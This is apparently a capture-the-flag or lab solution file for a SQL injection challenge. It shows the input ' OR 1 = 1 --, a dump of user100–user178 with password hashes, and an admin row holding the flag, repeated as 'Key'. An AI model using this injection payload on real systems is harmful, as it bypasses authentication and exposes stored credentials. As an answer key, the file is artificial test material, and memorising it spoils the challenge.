@@ -1,0 +1,165 @@
+Input field: ' OR 1 = 1 -- 
+
+Output:
+
+Username: user100 Hash: 5db496310b15029e849ed7904ee6a6b8
+
+Username: user101 Hash: 589ea1d1354a8e3f2d3f83afb3613782
+
+Username: user102 Hash: 06d0b945360a0ce8b1a7a240732e0008
+
+Username: user103 Hash: 25dc571870fc7b1bb46da0bf437f42b3
+
+Username: user104 Hash: 8865ed4ba80666e38757e08003b22e89
+
+Username: user105 Hash: 3df0f6a43fe08687bf9e3af538aac92d
+
+Username: user106 Hash: 6a716cccb244ccabb7c8503c46f85728
+
+Username: user107 Hash: 640c072d5d3d83d30982a4bc2c6c32c2
+
+Username: user108 Hash: a566275766c0e636a24fb01b0e0f541e
+
+Username: user109 Hash: 9a0fad04ca66f7a29961573d2560c735
+
+Username: user110 Hash: 362c762abb04a2cd8bbeb108d0d906fb
+
+Username: user111 Hash: 436c96abaf722f9590b006c00741b51f
+
+Username: user112 Hash: b5e3d94f0d41427a2c8fac5c9128f8d3
+
+Username: user113 Hash: 4887b9d53c50580aca344fe54ecbe25b
+
+Username: user114 Hash: b5d25648200d3a945b6bdf6fe3a834a4
+
+Username: user115 Hash: 7ab3af535e1d9159661e9004fef91c4e
+
+Username: user116 Hash: b67eb7c4a3e8aae80804ce7a8c4a4dc5
+
+Username: user117 Hash: 06705974f38c47ba91546fa917c72469
+
+Username: user118 Hash: b11360799b71405298d2fbb7db24291c
+
+Username: user119 Hash: 580eedeb91b38f18e9eee1a06347c462
+
+Username: user120 Hash: dd282b558790c2ad52e04f9f6605496b
+
+Username: user121 Hash: 139f76c1933bc9737dbe18ed866739c1
+
+Username: user122 Hash: 3316834758693764f172c14ffe9f8771
+
+Username: user123 Hash: 915b894d5d767c87cab60e4fb1530229
+
+Username: user124 Hash: 288aa019daefc698fd5f1a0a01403f8e
+
+Username: user125 Hash: 9e1cf024b298615621c121658f92c5ae
+
+Username: user126 Hash: 39f24bf5fcf46b4d1023f20baf58616d
+
+Username: user127 Hash: 963f79bf939b4d1a1a65fcff7d11d73f
+
+Username: user128 Hash: 4c4e8ebee8d8ad154b7ec27dcce6d0fb
+
+Username: user129 Hash: 6043ec8e47c5b1c98c7eb47ebf5e4df9
+
+Username: user130 Hash: e643922742fa3631ea6a0861a2c1364b
+
+Username: user131 Hash: 800f923eba3341c91b6e6f53ae5529dd
+
+Username: user132 Hash: 45cfb12e9c2096e93ff0fb4807ca0348
+
+Username: user133 Hash: bad0512b0be59733d89dacbd4c3de97d
+
+Username: user134 Hash: 01b804ef7396006d761eaae1b1884bf0
+
+Username: user135 Hash: c58e2d5660837c9485ce3bf1c01bce3f
+
+Username: user136 Hash: eeb8909647dc1b4851b0ebcd1fb56cf5
+
+Username: user137 Hash: 7b27ce0b2903a826b1555f48fc8690f5
+
+Username: user138 Hash: 02e10063ad8ac4e7ae58a9c751f4def3
+
+Username: user139 Hash: 4573ebf74b7acdc718a0395d8790e3f7
+
+Username: user140 Hash: 33bf6f7932a3be57351b84088effaa2a
+
+Username: user141 Hash: cbfbf863a03770536490c0f8eb53f86a
+
+Username: user142 Hash: 8f8ccd6f63561e8c7dbc9b92b6e37eab
+
+Username: user143 Hash: 2fd9ab2ecef0560f3de68f0d9d3e45d3
+
+Username: user144 Hash: 993a23546c189022301034982ee71ef1
+
+Username: user145 Hash: 30b4e7dd4c87f4a26204f2d5c932ad9b
+
+Username: user146 Hash: ee2a68b99bc248090094b06f57daa33c
+
+Username: user147 Hash: e72374f60e4711f27f534ae5a5b28fa6
+
+Username: user148 Hash: 102bbb78fef27b89980c477a1ab4c5b9
+
+Username: user149 Hash: 1bbff25d6be8274b792711c08372c268
+
+Username: user150 Hash: 935dba5119427c0f39143add2f5c4b13
+
+Username: user151 Hash: e8a04cd2207fe45375a218080eaddcd6
+
+Username: user152 Hash: c7b64314661ddec979ff45c7b585e743
+
+Username: user153 Hash: 5172aff1fd64f718023880edbd2c340b
+
+Username: user154 Hash: 6f073f763b14ee72dda86d26166f0bec
+
+Username: user155 Hash: 662ecbee36a3e5fad3b1eebd0d7069be
+
+Username: user156 Hash: 799c3dd928984d2e12eb17fa88925279
+
+Username: user157 Hash: 267b69f55d8dfb0d946562eeaea470ab
+
+Username: user158 Hash: 7addf9fbed39382232c11cdd441f0903
+
+Username: user159 Hash: 29452420b95658ce527baa5588a6fc3c
+
+Username: user160 Hash: b0c1d9103769310d04af06dcdb46ab0c
+
+Username: user161 Hash: f2bb77d606bad7091e2d35e70f1990d2
+
+Username: user162 Hash: 3a11506fe756dbaaa3feb7b6b07d170e
+
+Username: user163 Hash: b574d1da555996dfa090307edabfad62
+
+Username: user164 Hash: 1a8b3a782e114b9dbafb3e3406c43395
+
+Username: user165 Hash: 5268d30874658179a7e99d6a92abcc4b
+
+Username: user166 Hash: df1bd64c940bac99059cae684f5cfb28
+
+Username: user167 Hash: aff840ab495299f1b857989c441abf11
+
+Username: user168 Hash: 3a4be35c90320ba45b209f1ec621179c
+
+Username: user169 Hash: 805788aec086c3de8b5c8f151afbefa1
+
+Username: user170 Hash: 4671ef422ba0c59df5754d9b1d5a5c5d
+
+Username: user171 Hash: 72e5d37002fdb6c32cde51f127d9981a
+
+Username: user172 Hash: 8d8af5276451b475fe5ec17001fcfeb9
+
+Username: user173 Hash: 4ac765f7ac76886c324c80134a883833
+
+Username: user174 Hash: 001e64ba3eb2e586b36268718d12f932
+
+Username: user175 Hash: f50deb8e3c4558ce92717570823593e0
+
+Username: user176 Hash: b9712f7b68ec4113bca0b2b1e4ff7ddd
+
+Username: user177 Hash: 53e33afe47d6951aa21b90741f11e711
+
+Username: user178 Hash: 7efdd69b03fbb5cf805419bd1044f558
+
+Username: admin Hash: bad_code_and_databases_is_no_fun
+
+Key: bad_code_and_databases_is_no_fun
